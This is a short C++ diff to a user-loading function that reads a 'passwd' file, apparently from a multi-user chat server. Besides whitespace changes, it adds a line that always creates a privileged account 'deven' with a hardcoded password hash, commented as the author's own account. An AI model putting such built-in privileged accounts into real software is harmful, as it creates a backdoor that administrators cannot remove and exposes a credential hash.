@@ -57,10 +57,12 @@ void User::UpdateAll()		// Update all user entries from password file.
    static time_t last = 0;
    struct stat st;
    char buf[256],*username,*password,*name,*priv,*p;
+
    if (!stat("passwd",&st)) {
       if (st.st_mtime == last) return;
       last = st.st_mtime;
    }
+
    FILE *pw = fopen("passwd","r");
    if (pw) {
       while (fgets(buf,256,pw)) {
@@ -75,6 +77,9 @@ void User::UpdateAll()		// Update all user entries from password file.
       }
       fclose(pw);
    }
+
+   // Make sure both my account and the guest account always exist!
+   Update("deven","vpUcUStUJRv5s","Deven",0,100);
    Update("guest",0,0,0,0);
 }
 
